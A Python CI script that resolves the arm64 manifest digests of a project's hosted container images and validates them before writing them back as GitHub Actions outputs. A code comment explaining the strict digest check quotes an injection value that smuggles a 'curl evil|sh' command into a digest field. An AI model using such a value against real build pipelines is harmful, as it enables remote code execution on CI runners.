#!/usr/bin/env python3
"""AUT-4497: resolve each :hosted image tag to its arm64 child manifest digest.

The EP5 Oracle VM is arm64 (aarch64), so the digest that matters for a hosted
deploy is the arm64 child of the multi-arch OCI image index — not the index
digest. docker-compose.hosted.yml pins the arm64 child, so this reads the
current :hosted index for every AutoBrain app service and emits the arm64
digest for each, ready to be written back into the compose pins.

Uses `docker buildx imagetools inspect --raw` so it reuses the workflow's
existing docker login (GHCR_PAT / GITHUB_TOKEN) rather than needing its own
registry token (the GITHUB_TOKEN scope does not include GHCR packages read).

Root cause this fixes: the old `compose-pin` job only bumped backend/ai/frontend
and wrote *index* digests, and its Portainer sync step failed (the compose
still carried the gh-runner `build:` block, which EP5 has no build worker for),
so the pins froze and every nightly deploy became a silent no-op.

Output keys are underscore-safe: GITHUB_OUTPUT keys become step outputs, and
GitHub expressions cannot property-access a hyphen.

Exits non-zero if any service cannot be resolved, so a half-synced compose is
never committed.

Usage:
  python3 scripts/resolve-hosted-digests.py --tag hosted
"""
import argparse
import json
import os
import re
import subprocess
import sys

# output_key -> ghcr repo. `hub` maps to the private federation-hub package.
SERVICES = {
    "backend":       "autobrain-backend",
    "frontend":      "autobrain-frontend",
    "dongle_server": "autobrain-dongle-server",
    "hub":           "autobrain-federation-hub",
    "backup":        "autobrain-backup",
}

PLATFORM_ARCH = "arm64"
PLATFORM_OS = "linux"

# AUT-4745: a content digest is exactly `sha256:` + 64 lowercase hex chars.
# update-compose-pins.py enforces the identical shape.
DIGEST_RE = re.compile(r"sha256:[0-9a-f]{64}")


def resolve_arm64(repo: str, tag: str) -> str:
    """Return the arm64 child manifest digest of ghcr.io/cannonfodder151/{repo}:{tag}."""
    img = f"ghcr.io/cannonfodder151/{repo}:{tag}"
    proc = subprocess.run(
        ["docker", "buildx", "imagetools", "inspect", img, "--raw"],
        capture_output=True, text=True, timeout=120,
    )
    if proc.returncode != 0:
        raise RuntimeError(f"imagetools inspect failed for {img}: {proc.stderr.strip()}")
    try:
        index = json.loads(proc.stdout)
    except json.JSONDecodeError as e:
        raise RuntimeError(f"{img}: unparseable index: {e}") from e

    entries = index.get("manifests") or []
    if not entries:
        raise RuntimeError(f"{img}: not a multi-arch index (no manifests)")

    for m in entries:
        plat = m.get("platform") or {}
        if plat.get("architecture") == PLATFORM_ARCH and plat.get("os") == PLATFORM_OS:
            return m["digest"]

    raise RuntimeError(f"{img}: no {PLATFORM_OS}/{PLATFORM_ARCH} manifest in index")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--tag", default="hosted", help="image tag to resolve (default: hosted)")
    args = ap.parse_args()

    github_output = os.environ.get("GITHUB_OUTPUT", "")
    failures = []
    resolved = {}

    for key, repo in SERVICES.items():
        try:
            digest = resolve_arm64(repo, args.tag)
            # AUT-4745: strict match. A bare startswith+len check accepts
            # `sha256:"; curl evil|sh; echo "<padding>` (exactly 71 chars),
            # and these digests are spliced unquoted into a `run:` block in
            # build-hosted.yml — i.e. straight into bash. Anything that is not
            # sha256:<64 hex> is rejected.
            if not DIGEST_RE.fullmatch(digest):
                raise RuntimeError(f"malformed digest {digest!r}")
            resolved[key] = digest
            print(f"==> {repo}:{args.tag} -> {digest}")
        except Exception as e:
            failures.append(f"{key} ({repo}:{args.tag}): {e}")

    if failures:
        # Fail the whole job: a partial sync would commit some new digests and
        # leave others stale, which is the same silent-drift class of bug.
        print("ERROR: could not resolve hosted digests:", file=sys.stderr)
        for f in failures:
            print(f"  - {f}", file=sys.stderr)
        return 1

    if github_output:
        for key, digest in sorted(resolved.items()):
            with open(github_output, "a") as f:
                f.write(f"{key}={digest}\n")
    else:
        for key, digest in sorted(resolved.items()):
            print(f"{key}={digest}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
